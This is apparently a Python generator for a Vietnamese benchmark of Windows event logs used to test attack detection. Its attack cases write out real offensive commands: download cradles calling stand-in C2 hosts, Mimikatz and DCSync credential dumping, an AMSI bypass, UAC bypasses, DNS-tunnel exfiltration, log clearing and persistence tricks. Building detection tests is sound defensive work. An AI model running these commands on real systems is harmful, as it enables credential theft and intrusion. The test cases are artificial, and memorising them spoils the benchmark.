        ("winget_search", "Tìm kiếm gói phần mềm tiện ích trong kho Microsoft Store.", "winget.exe search 7zip"),
    ]

    for i in range(1, 151):
        idx_tmpl = (i - 1) % len(benign_templates)
        tmpl_key, tmpl_desc, tmpl_cmd = benign_templates[idx_tmpl]
        cid = f"case_b1_norm_{i:03d}_{tmpl_key}"
        rec = 2000 + i
        sec = [create_security_event_xml(4688, format_win_time(base_time + timedelta(seconds=i)), rec, {
            "SubjectUserName": "user_marketing" if i % 2 == 0 else "dev_backend",
            "CommandLine": tmpl_cmd,
            "NewProcessName": tmpl_cmd.split()[0],
        })]
        ps = []
        if "powershell" in tmpl_cmd.lower():
            ps.append(create_powershell_event_xml(tmpl_cmd, format_win_time(base_time + timedelta(seconds=i)), rec))
        manifests.append(write_case(target, cid, "Benign", "NORMAL", tmpl_desc, "-", "Bài 1", sec, ps))

    with open(target / "danh_sach_ca_bai_1.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(manifests[0].keys()))
        w.writeheader()
        w.writerows(manifests)
    print(f"[✓] Đã tạo thành công BÀI 1: {len(manifests)} ca kiểm thử ({len(attack_defs)} Attack + {len(manifests)-len(attack_defs)} Normal)")
    return manifests


# ==============================================================================
# BÀI 2: CHUỖI SỰ KIỆN ĐA BƯỚC & TƯƠNG QUAN LotL - 200 CA
# ==============================================================================
def build_scenario_2():
    target = BENCH_DIR / "bai_2_chuoi_da_buoc"
    target.mkdir(parents=True, exist_ok=True)
    base_time = datetime(2026, 10, 26, 9, 0, 0)
    manifests = []

    # 50 Attack Cases (Multi-stage Kill Chains & LotL)
    attack_multi_defs = [
        ("case_b2_att_01_bruteforce_to_backdoor", "MultiStage", "Chuỗi: Dò mật khẩu 8 lần -> Đăng nhập thành công -> Tạo tài khoản quản trị backdoor.", "T1110 / T1078 / T1136",
         [(4625, {"TargetUserName": "admin", "IpAddress": "192.168.1.185", "LogonType": "3"}),
          (4625, {"TargetUserName": "admin", "IpAddress": "192.168.1.185", "LogonType": "3"}),
          (4625, {"TargetUserName": "admin", "IpAddress": "192.168.1.185", "LogonType": "3"}),
          (4625, {"TargetUserName": "admin", "IpAddress": "192.168.1.185", "LogonType": "3"}),
          (4625, {"TargetUserName": "admin", "IpAddress": "192.168.1.185", "LogonType": "3"}),
          (4625, {"TargetUserName": "admin", "IpAddress": "192.168.1.185", "LogonType": "3"}),
          (4625, {"TargetUserName": "admin", "IpAddress": "192.168.1.185", "LogonType": "3"}),
          (4625, {"TargetUserName": "admin", "IpAddress": "192.168.1.185", "LogonType": "3"}),
          (4624, {"TargetUserName": "admin", "IpAddress": "192.168.1.185", "LogonType": "3"}),
          (4688, {"SubjectUserName": "admin", "CommandLine": "net.exe user backdoor_svc P@ssw0rd123! /add"}),
          (4688, {"SubjectUserName": "admin", "CommandLine": "net.exe localgroup Administrators backdoor_svc /add"})], []),
        ("case_b2_att_02_recon_then_mimikatz", "MultiStage", "Chuỗi: Trinh sát hệ thống whoami /priv -> nltest -> Dump LSASS bằng Mimikatz.", "T1033 / T1003.001",
         [(4688, {"SubjectUserName": "operator", "CommandLine": "whoami.exe /priv"}),
          (4688, {"SubjectUserName": "operator", "CommandLine": "net.exe user"}),
          (4688, {"SubjectUserName": "operator", "CommandLine": "nltest.exe /dclist:CORP"}),
          (4688, {"SubjectUserName": "operator", "CommandLine": "powershell.exe -c \"Invoke-Mimikatz -DumpCreds\""})],
         ["Invoke-Mimikatz -DumpCreds"]),
        ("case_b2_att_03_c2_download_log_clear", "MultiStage", "Chuỗi: Tải mã độc ngầm C2 qua WebClient -> Xóa sạch nhật ký Security 1102.", "T1059.001 / T1070.001",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadString('http://c2.xyz/beacon.ps1')"}),
          (1102, {}),
          (4688, {"SubjectUserName": "attacker", "CommandLine": "wevtutil.exe cl Security"})],
         ["(New-Object Net.WebClient).DownloadString('http://c2.xyz/beacon.ps1')"]),
        ("case_b2_att_04_rdp_after_hours_schtasks", "MultiStage", "Chuỗi: RDP ngoài giờ làm việc (LogonType 10) từ IP lạ -> Cài đặt Schtasks Persistence.", "T1078.002 / T1053.005",
         [(4624, {"TargetUserName": "admin", "IpAddress": "194.26.29.112", "LogonType": "10"}),
          (4688, {"SubjectUserName": "admin", "CommandLine": "schtasks.exe /create /tn \"SystemUpdater\" /tr \"C:\\Users\\Public\\beacon.exe\" /sc onlogon /ru SYSTEM"})], []),
        ("case_b2_att_05_bloodhound_kerberoast", "MultiStage", "Chuỗi: Chạy SharpHound thu thập đồ thị AD -> Yêu cầu vé TGS Kerberoasting.", "T1087.002 / T1558.003",
         [(4688, {"SubjectUserName": "hacker", "CommandLine": "powershell.exe -c \"Invoke-BloodHound -CollectionMethod All -ZipFileName ad.zip\""}),
          (4688, {"SubjectUserName": "hacker", "CommandLine": "powershell.exe -c \"Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat\""})],
         ["Invoke-BloodHound -CollectionMethod All", "Get-DomainUser -SPN | Get-DomainSPNTicket"]),
        ("case_b2_att_06_psexec_remote_service", "LateralMovement", "Chuỗi: PsExec kết nối máy chủ quản trị -> Cài đặt remote service PSEXESVC -> Điều khiển.", "T1569.002",
         [(4688, {"SubjectUserName": "CORP\\admin", "CommandLine": "psexec.exe \\\\192.168.1.150 -u CORP\\admin -p SuperP@ss! -s -d cmd.exe /c whoami"}),
          (7045, {"ServiceName": "PSEXESVC", "ImagePath": "%SystemRoot%\\PSEXESVC.exe"})], []),
        ("case_b2_att_07_wmic_remote_exec", "LateralMovement", "Chuỗi: WMIC Remote Process Call tạo tiến trình ngầm trên máy chủ kế toán.", "T1047",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "wmic.exe /node:192.168.1.180 /user:admin /password:Adm1n! process call create \"cmd.exe /c powershell.exe -w hidden (New-Object Net.WebClient).DownloadString('http://c2.biz/run.ps1')\""})], []),
        ("case_b2_att_08_dcsync_ticket_theft", "CredentialAccess", "Chuỗi: Tấn công DCSync mô phỏng Domain Controller qua DRSGetNCChanges lấy hash krbtgt.", "T1003.006",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "powershell.exe -c \"Invoke-Mimikatz -Command 'lsadump::dcsync /domain:corp.local /user:krbtgt'\""})],
         ["lsadump::dcsync /domain:corp.local /user:krbtgt"]),
        ("case_b2_att_09_portscan_to_admin_share", "LateralMovement", "Chuỗi: Dò quét cổng SMB 445 -> Kết nối ổ đĩa ẩn C$ -> Thả trojan.exe.", "T1046 / T1021.002",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "net.exe use \\\\192.168.1.200\\C$ /user:CORP\\administrator Password123!"}),
          (4688, {"SubjectUserName": "attacker", "CommandLine": "cmd.exe /c copy C:\\Temp\\implant.exe \\\\192.168.1.200\\C$\\Windows\\Temp\\"})], []),
        ("case_b2_att_10_tar_staging_dns_exfil", "Exfiltration", "Chuỗi: Thu thập tài liệu docx/xlsx thành tệp tar.gz -> Tuồn dữ liệu qua DNS Tunneling.", "T1560 / T1048.003",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "tar.exe -czvf C:\\Windows\\Temp\\data.tar.gz -C C:\\Users\\victim\\Documents *.docx *.xlsx *.pdf"}),
          (4688, {"SubjectUserName": "attacker", "CommandLine": "nslookup.exe -q=txt dGVzdGRhdGE=.tunnel.attacker.com"})], []),
        ("case_b2_att_11_wmi_event_persistence", "Persistence", "Chuỗi: Đăng ký WMI Event Subscription (__EventFilter & __CommandLineEventConsumer) tự chạy ngầm.", "T1546.003",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "wmic.exe /namespace:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"BypassFilter\", EventNamespace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\""})], []),
        ("case_b2_att_12_dll_search_order_hijack", "Persistence", "Chuỗi: Ghi đè DLL độc hại vào thư mục phần mềm nghiệp vụ để chiếm quyền khi ứng dụng mở.", "T1574.001",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "cmd.exe /c copy C:\\Temp\\malicious_version.dll \"C:\\Program Files\\AccountingApp\\version.dll\""})], []),
        ("case_b2_att_13_powerview_domain_trust", "Discovery", "Chuỗi: Sử dụng PowerView trinh sát quan hệ ủy thác Domain Trust và Forest Active Directory.", "T1482",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "powershell.exe -ep bypass -c \"Import-Module .\\PowerView.ps1; Get-NetDomainTrust; Get-NetForestDomain\""})],
         ["Import-Module .\\PowerView.ps1; Get-NetDomainTrust; Get-NetForestDomain"]),
        ("case_b2_att_14_ssh_tunneling_c2", "CommandAndControl", "Chuỗi: Thiết lập SSH Reverse Tunneling port 4444 vượt tường lửa nội bộ công ty.", "T1572",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "plink.exe -R 4444:127.0.0.1:3389 root@remote-c2.net -pw P@ssw0rd123 -N"})], []),
        ("case_b2_att_15_printnightmare_spooler", "PrivilegeEscalation", "Chuỗi: Khai thác lỗ hổng PrintNightmare tải driver máy in độc hại leo quyền SYSTEM.", "T1068",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "powershell.exe -c \"Invoke-Nightmare -DriverName 'PrintDriver' -Payload 'C:\\Users\\Public\\rev.dll'\""})],
         ["Invoke-Nightmare -DriverName 'PrintDriver' -Payload 'C:\\Users\\Public\\rev.dll'"]),
    ]

    # Mở rộng cho đủ 50 ca tấn công chuỗi
    for k in range(16, 51):
        attack_multi_defs.append((
            f"case_b2_att_{k:02d}_apt_chain_step",
            "MultiStage",
            f"Chuỗi tấn công APT bước {k}: Trinh sát nội bộ kết hợp leo quyền và duy trì cơ chế xâm nhập.",
            "T1078 / T1059 / T1003",
            [(4688, {"SubjectUserName": "apt_attacker", "CommandLine": f"powershell.exe -ep bypass -c \"Invoke-Stage -Step {k} -Target 'CORP-DC01'\""})],
            [f"Invoke-Stage -Step {k} -Target 'CORP-DC01'"]
        ))

    for cid, cat, desc, mitre, sec_events_raw, ps_scripts in attack_multi_defs:
        sec = []
        rec = 3000
        for ev in sec_events_raw:
            rec += 1
            eid = ev[0]
            data = ev[1]
            sec.append(create_security_event_xml(eid, format_win_time(base_time), rec, data))
        ps = []
        for s in ps_scripts:
            rec += 1
            ps.append(create_powershell_event_xml(s, format_win_time(base_time), rec))
        manifests.append(write_case(target, cid, cat, "ALERT", desc, mitre, "Bài 2", sec, ps))

    # 150 Benign Multi-step Business Cases
    multi_benign_templates = [
        ("backup_pipeline", "Quy trình nén tệp tin sao lưu cơ sở dữ liệu và copy sang NAS.", [
            "powershell.exe -c Compress-Archive -Path C:\\DB_Data -DestinationPath C:\\Backup\\db.zip",
            "robocopy.exe C:\\Backup \\\\nas01\\sql_backup db.zip /Z",
            "cmd.exe /c echo Backup completed successfully > C:\\Backup\\status.log"
        ]),
        ("devops_deploy", "Quy trình DevOps: Pull mã nguồn -> Build npm -> Khởi động Docker Compose.", [
            "git.exe pull origin main",
            "npm.cmd run build",
            "docker.exe compose up -d"
        ]),
        ("it_admin_remote_support", "Quy trình IT Support: Kết nối RDP giờ hành chính -> Mở Compmgmt -> Restart Spooler.", [
            "mstsc.exe /v:192.168.1.55",
            "mmc.exe compmgmt.msc",
            "net.exe stop spooler",
            "net.exe start spooler"
        ]),
        ("nessus_security_audit", "Quy trình quét kiểm kê tài sản hệ thống tự động qua WMI định kỳ.", [
            "wmic.exe bios get serialnumber",
            "wmic.exe cpu get name,numberofcores",
            "wmic.exe os get caption,version"
        ]),
        ("onedrive_sync_flow", "Quy trình đồng bộ hóa dữ liệu đám mây OneDrive doanh nghiệp.", [
            "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe /background",
            "attrib.exe +u C:\\Users\\user\\OneDrive\\Reports",
            "cmd.exe /c dir C:\\Users\\user\\OneDrive"
        ]),
        ("db_maintenance_sql", "Quy trình bảo trì CSDL SQL Server: Shrink log -> Checkdb -> Index rebuild.", [
            "sqlcmd.exe -S .\\SQLEXPRESS -E -Q \"DBCC CHECKDB (BillingDB)\"",
            "sqlcmd.exe -S .\\SQLEXPRESS -E -Q \"ALTER INDEX ALL ON Invoices REBUILD\""
        ]),
        ("network_monitoring", "Quy trình kiểm tra định tuyến và tình trạng card mạng máy chủ.", [
            "ipconfig.exe /flushdns",
            "ping.exe -n 2 8.8.8.8",
            "tracert.exe -d 1.1.1.1"
        ]),
        ("user_migration_flow", "Quy trình di chuyển hồ sơ người dùng máy tính cũ sang máy mới.", [
            "robocopy.exe C:\\Users\\OldUser C:\\Users\\NewUser /E /COPYALL /R:1 /W:1",
            "icacls.exe C:\\Users\\NewUser /grant NewUser:(OI)(CI)F"
        ]),
    ]

    for i in range(1, 151):
        idx_tmpl = (i - 1) % len(multi_benign_templates)
        tmpl_key, tmpl_desc, cmds = multi_benign_templates[idx_tmpl]
        cid = f"case_b2_norm_{i:03d}_{tmpl_key}"
        rec = 4000 + i * 10
        sec = []
        ps = []
        for c in cmds:
            rec += 1
            sec.append(create_security_event_xml(4688, format_win_time(base_time + timedelta(seconds=i)), rec, {
                "SubjectUserName": "corp_admin" if "admin" in tmpl_key else "dev_pipeline",
                "CommandLine": c,
                "NewProcessName": c.split()[0],
            }))
            if "powershell" in c.lower():
                ps.append(create_powershell_event_xml(c, format_win_time(base_time + timedelta(seconds=i)), rec))
        manifests.append(write_case(target, cid, "Benign", "NORMAL", tmpl_desc, "-", "Bài 2", sec, ps))

    with open(target / "danh_sach_ca_bai_2.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(manifests[0].keys()))
        w.writeheader()
        w.writerows(manifests)
    print(f"[✓] Đã tạo thành công BÀI 2: {len(manifests)} ca kiểm thử ({len(attack_multi_defs)} Attack + {len(manifests)-len(attack_multi_defs)} Normal)")
    return manifests


# ==============================================================================
# BÀI 3: CHỐNG NHẬN DIỆN NHẦM DO NGƯỜI DÙNG VÔ Ý (Hard Negatives) - 200 CA
# ==============================================================================
def build_scenario_3():
    target = BENCH_DIR / "bai_3_nguoi_dung_vo_y"
    target.mkdir(parents=True, exist_ok=True)
    base_time = datetime(2026, 10, 26, 10, 0, 0)
    manifests = []

    # 50 Stealth / Obfuscated Attack Cases
    stealth_attacks = [
        ("case_b3_att_01_amsi_bypass_patch", "DefenseEvasion", "Vô hiệu hóa AMSI bằng in-memory patch AmsiUtils.amsiInitFailed.", "T1562.001",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "powershell.exe -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\""})],
         ["[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"]),
        ("case_b3_att_02_cmstp_uac_bypass", "PrivilegeEscalation", "Lợi dụng trình cài đặt mạng CMSTP.exe vượt qua UAC Leo quyền Administrator.", "T1548.002",
         [(4688, {"SubjectUserName": "operator", "CommandLine": "cmstp.exe /au C:\\Users\\Public\\uac_bypass.inf"})], []),
        ("case_b3_att_03_fodhelper_uac_bypass", "PrivilegeEscalation", "Lợi dụng fodhelper.exe đọc khóa Registry ms-settings leo quyền UAC ngầm.", "T1548.002",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "reg.exe add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe /c start calc.exe\" /f"}),
          (4688, {"SubjectUserName": "attacker", "CommandLine": "C:\\Windows\\System32\\fodhelper.exe"})], []),
        ("case_b3_att_04_eventvwr_msc_hijack", "PrivilegeEscalation", "Kỹ thuật UAC Bypass thông qua Eventvwr.exe hijack mscfile shell open.", "T1548.002",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "reg.exe add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d \"powershell.exe -w hidden C:\\payload.ps1\" /f"})], []),
        ("case_b3_att_05_regsvr32_squiblydoo_remote", "DefenseEvasion", "Tấn công Squiblydoo nạp scriptlet từ domain c2 qua regsvr32.", "T1218.010",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "regsvr32.exe /s /n /u /i:http://malware-drop.com/beacon.sct scrobj.dll"})], []),
        ("case_b3_att_06_mshta_vbscript_inline", "Execution", "Thực thi payload VBScript inline thông qua tiện ích mshta.exe.", "T1218.005",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -nop -c (New-Object Net.WebClient).DownloadString('http://c2.org/s.ps1')\"\",0:close\")"})], []),
        ("case_b3_att_07_rundll32_advpack_inf_exec", "DefenseEvasion", "Rundll32 gọi advpack.dll cài đặt payload thông qua INF file.", "T1218.011",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "rundll32.exe advpack.dll,LaunchINFSection C:\\Users\\Public\\stage.inf,DefaultInstall,1,"})], []),
        ("case_b3_att_08_in_memory_reflection_net", "Execution", "Nạp reflective assembly .NET trực tiếp vào bộ nhớ RAM qua [System.Reflection.Assembly]::Load.", "T1059.001",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "powershell.exe -c \"[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA...')).EntryPoint.Invoke($null,$null)\""})],
         ["[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA...')).EntryPoint.Invoke($null,$null)"]),
        ("case_b3_att_09_ransomware_extension_loop", "Impact", "Vòng lặp đổi tên hàng loạt tệp tin người dùng sang đuôi .locked tống tiền.", "T1486",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "powershell.exe -c \"Get-ChildItem -Path C:\\Users -Include *.docx,*.xlsx,*.pdf -Recurse | ForEach-Object { Rename-Item $_.FullName ($_.FullName + '.locked') }\""})],
         ["Get-ChildItem -Path C:\\Users -Include *.docx,*.xlsx,*.pdf -Recurse | ForEach-Object { Rename-Item $_.FullName ($_.FullName + '.locked') }"]),
        ("case_b3_att_10_net_stop_eventlog_disabled", "DefenseEvasion", "Dừng và vô hiệu hóa dịch vụ ghi nhật ký sự kiện Windows EventLog.", "T1562.002",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "sc.exe config eventlog start= disabled"}),
          (4688, {"SubjectUserName": "attacker", "CommandLine": "net.exe stop eventlog /y"})], []),
        ("case_b3_att_11_sticky_keys_backdoor", "Persistence", "Gán cmd.exe vào sethc.exe để mở backdoor màn hình khóa Windows.", "T1546.008",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f"})], []),
        ("case_b3_att_12_appcertdlls_persistence", "Persistence", "Ghi tên DLL độc hại vào AppCertDlls để tự nạp cùng mọi tiến trình.", "T1546.009",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs\" /v CertHijack /t REG_SZ /d \"C:\\Windows\\Temp\\inject.dll\" /f"})], []),
        ("case_b3_att_13_shim_sdbinst_install", "Persistence", "Cài đặt cơ sở dữ liệu Shim tùy chỉnh qua sdbinst để hooking tiến trình.", "T1546.011",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "sdbinst.exe -q C:\\Users\\Public\\custom_shim.sdb"})], []),
        ("case_b3_att_14_com_hijack_clsid", "Persistence", "COM Object Hijacking: Ghi đè InprocServer32 trong HKCU CLSID.", "T1546.015",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "reg.exe add \"HKCU\\Software\\Classes\\CLSID\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\InprocServer32\" /ve /t REG_SZ /d \"C:\\Users\\Public\\com_payload.dll\" /f"})], []),
        ("case_b3_att_15_obfuscated_string_cradle", "Execution", "PowerShell làm rối chuỗi bằng ký tự backtick và ghép chuỗi d`o`w`n`l`o`a`d.", "T1059.001",
         [(4688, {"SubjectUserName": "attacker", "CommandLine": "powershell.exe -c \"$w = Ne`w-Ob`je`ct Ne`t.We`bCl`ie`nt; I`E`X $w.Do`wn`lo`adSt`ri`ng('http://c2.biz/obf.ps1')\""})],
         ["$w = Ne`w-Ob`je`ct Ne`t.We`bCl`ie`nt; I`E`X $w.Do`wn`lo`adSt`ri`ng('http://c2.biz/obf.ps1')"]),
    ]

    for k in range(16, 51):
        stealth_attacks.append((
            f"case_b3_att_{k:02d}_stealth_evasion_sample",
            "DefenseEvasion",
            f"Tấn công trốn tránh phát hiện nâng cao kịch bản {k}: Che giấu hành vi và vô hiệu hóa cơ chế cảnh báo.",
            "T1562 / T1059",
            [(4688, {"SubjectUserName": "stealth_actor", "CommandLine": f"powershell.exe -ep bypass -w hidden -c \"Invoke-Evasion -Technique {k}\""})],
            [f"Invoke-Evasion -Technique {k}"]
        ))

    for cid, cat, desc, mitre, sec_cmds, ps_scripts in stealth_attacks:
        sec = []
        rec = 5000
        for cmd_item in sec_cmds:
            rec += 1
            sec.append(create_security_event_xml(cmd_item[0], format_win_time(base_time), rec, cmd_item[1]))
        ps = []
        for s in ps_scripts:
            rec += 1
            ps.append(create_powershell_event_xml(s, format_win_time(base_time), rec))
        manifests.append(write_case(target, cid, cat, "ALERT", desc, mitre, "Bài 3", sec, ps))

    # 150 Hard Negative Benign Cases (Người dùng vô ý / Quản trị IT)
    hard_negatives = [
        ("typo_logon_once", "Người dùng vô ý gõ nhầm mật khẩu 1 lần rồi đăng nhập thành công ngay sau đó.", [
            (4625, {"TargetUserName": "accountant_lan", "IpAddress": "192.168.1.45", "LogonType": "2"}),
            (4624, {"TargetUserName": "accountant_lan", "IpAddress": "192.168.1.45", "LogonType": "2"})
        ]),
        ("typo_admin_twice", "Quản trị viên gõ nhầm pass 2 lần do bật nhầm CapsLock rồi đăng nhập đúng.", [
            (4625, {"TargetUserName": "sysadmin_hung", "IpAddress": "192.168.1.10", "LogonType": "2"}),
            (4625, {"TargetUserName": "sysadmin_hung", "IpAddress": "192.168.1.10", "LogonType": "2"}),
            (4624, {"TargetUserName": "sysadmin_hung", "IpAddress": "192.168.1.10", "LogonType": "2"})
        ]),
        ("certutil_hashfile_sha256", "Kỹ sư dùng certutil.exe tính mã hash SHA256 để kiểm tra toàn vẹn tệp tin ISO.", [
            (4688, {"SubjectUserName": "dev_thang", "CommandLine": "certutil.exe -hashfile C:\\Downloads\\ubuntu-22.04.iso SHA256"})
        ]),
        ("it_create_new_employee", "Quản trị IT tạo tài khoản nhân viên mới hợp lệ theo yêu cầu phiếu hỗ trợ ticket.", [
            (4688, {"SubjectUserName": "it_admin", "CommandLine": "net.exe user nv_kinhdoanh_05 P@ssw0rd2026! /add"}),
            (4720, {"TargetUserName": "nv_kinhdoanh_05"})
        ]),
        ("powershell_curl_intranet", "PowerShell tải file cấu hình VPN nội bộ từ máy chủ mạng LAN an toàn.", [
            (4688, {"SubjectUserName": "employee", "CommandLine": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://intranet.corp.local/vpn_config.ovpn' -OutFile 'C:\\VPN\\vpn.ovpn'\""})
        ]),
        ("powershell_profile_check", "Hệ thống kiểm tra sự tồn tại của tệp hồ sơ cá nhân PowerShell profile.ps1.", [
            (4688, {"SubjectUserName": "developer", "CommandLine": "powershell.exe -c \"Test-Path $PROFILE\""})
        ]),
        ("scheduled_task_file_not_found", "Tác vụ lập lịch định kỳ thất bại do không tìm thấy file script đích (lỗi cú pháp vô hại).", [
            (4688, {"SubjectUserName": "SYSTEM", "CommandLine": "cmd.exe /c \"C:\\Scripts\\old_cleanup.bat\""})
        ]),
        ("bitlocker_status_query", "Quản trị viên kiểm tra trạng thái mã hóa ổ đĩa BitLocker bằng manage-bde.", [
            (4688, {"SubjectUserName": "it_admin", "CommandLine": "manage-bde.exe -status C:"})
        ]),
        ("sfc_system_verify", "Chạy tiện ích System File Checker quét và khôi phục tệp hệ thống bị hỏng.", [
            (4688, {"SubjectUserName": "it_admin", "CommandLine": "sfc.exe /scannow"})
        ]),
        ("dism_restorehealth", "Chạy công cụ DISM sửa chữa kho ảnh hệ thống từ Windows Update.", [
            (4688, {"SubjectUserName": "it_admin", "CommandLine": "dism.exe /online /cleanup-image /restorehealth"})
        ]),
        ("gpupdate_force", "Thực hiện ép buộc cập nhật Group Policy máy trạm từ Active Directory.", [
            (4688, {"SubjectUserName": "user", "CommandLine": "gpupdate.exe /force"})
        ]),
        ("netsh_firewall_add_rule", "Thêm quy tắc tường lửa cho phép phần mềm máy in nội bộ giao tiếp port 9100.", [
            (4688, {"SubjectUserName": "it_admin", "CommandLine": "netsh.exe advfirewall firewall add rule name=\"InternalPrinter\" dir=in action=allow protocol=TCP localport=9100"})
        ]),
        ("wireshark_dumpcap_diag", "Kỹ sư mạng bắt gói tin nội bộ qua loopback để chẩn đoán lỗi phần mềm.", [
            (4688, {"SubjectUserName": "net_engineer", "CommandLine": "dumpcap.exe -i 1 -c 100 -w C:\\Temp\\diag.pcapng"})
        ]),
        ("sevenzip_compress_docs", "Nhân viên dùng 7-Zip nén tài liệu cá nhân để gửi email cho đối tác.", [
            (4688, {"SubjectUserName": "user", "CommandLine": "7z.exe a -tzip C:\\Backup\\docs.zip C:\\Users\\user\\Documents"})
        ]),
        ("auditpol_inspect_settings", "Kiểm tra chính sách ghi nhật ký sự kiện Windows Audit Policy hiện tại.", [
            (4688, {"SubjectUserName": "it_admin", "CommandLine": "auditpol.exe /get /category:*"})
        ]),
    ]

    for i in range(1, 151):
        idx_tmpl = (i - 1) % len(hard_negatives)
        tmpl_key, tmpl_desc, ev_list = hard_negatives[idx_tmpl]
        cid = f"case_b3_norm_{i:03d}_{tmpl_key}"
        rec = 6000 + i * 10
        sec = []
        ps = []
        for ev in ev_list:
            rec += 1
            eid = ev[0]
            data = ev[1]
            sec.append(create_security_event_xml(eid, format_win_time(base_time + timedelta(seconds=i)), rec, data))
            cmd_text = data.get("CommandLine", "")
            if "powershell" in cmd_text.lower():
                ps.append(create_powershell_event_xml(cmd_text, format_win_time(base_time + timedelta(seconds=i)), rec))
        manifests.append(write_case(target, cid, "HardNegative", "NORMAL", tmpl_desc, "-", "Bài 3", sec, ps))

    with open(target / "danh_sach_ca_bai_3.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(manifests[0].keys()))
        w.writeheader()
        w.writerows(manifests)
    print(f"[✓] Đã tạo thành công BÀI 3: {len(manifests)} ca kiểm thử ({len(stealth_attacks)} Attack + {len(manifests)-len(stealth_attacks)} Normal)")
    return manifests


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Sinh lại bộ dữ liệu benchmark 600 ca vào data_benchmark/.")
    parser.add_argument("--force", action="store_true",
                        help="Bắt buộc khi data_benchmark/ đã có dữ liệu: XOÁ bai_1/2/3 cũ rồi sinh lại")
    args = parser.parse_args()
    existing = [BENCH_DIR / s for s in ("bai_1_chu_ky_tinh", "bai_2_chuoi_da_buoc", "bai_3_nguoi_dung_vo_y")
                if (BENCH_DIR / s).is_dir()]
    if existing and not args.force:
        print(f"[!] {BENCH_DIR} đã có dữ liệu. Chạy lại với --force để XOÁ và sinh lại (số liệu benchmark cũ sẽ thay đổi).")
        return

    print("=" * 85)
    print("   BẮT ĐẦU TẠO BỘ DỮ LIỆU ĐÁNH GIÁ 600 CA (200 CA / MỖI BÀI TEST)")
    print("=" * 85)
    BENCH_DIR.mkdir(parents=True, exist_ok=True)

    for sub in ["bai_1_chu_ky_tinh", "bai_2_chuoi_da_buoc", "bai_3_nguoi_dung_vo_y"]:
        d = BENCH_DIR / sub
        if d.is_dir():
            shutil.rmtree(d, ignore_errors=True)

    m1 = build_scenario_1()
    m2 = build_scenario_2()
    m3 = build_scenario_3()

    all_600 = m1 + m2 + m3

    # Xuất file CSV Ground Truth tổng thể 600 ca
    gt_file = BENCH_DIR / "cases_ground_truth_600.csv"
    with open(gt_file, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(all_600[0].keys()))
        w.writeheader()
        w.writerows(all_600)

    print("=" * 85)
    print(f"[✓] HOÀN TẤT TẠO 600 CA KIỂM THỬ TRÊN 3 BÀI ĐỘC LẬP:")
    print(f"    ├─ Bài 1 (Atomic & Signatures)       : {len(m1)} ca (50 Attack + 150 Normal)")
    print(f"    ├─ Bài 2 (Multi-stage LotL Chains)   : {len(m2)} ca (50 Attack + 150 Normal)")
    print(f"    ├─ Bài 3 (Hard Negatives & Mistakes) : {len(m3)} ca (50 Attack + 150 Normal)")
    print(f"    └─ File Ground Truth tổng hợp 600 ca : {gt_file}")
    print("=" * 85)


if __name__ == "__main__":
    main()
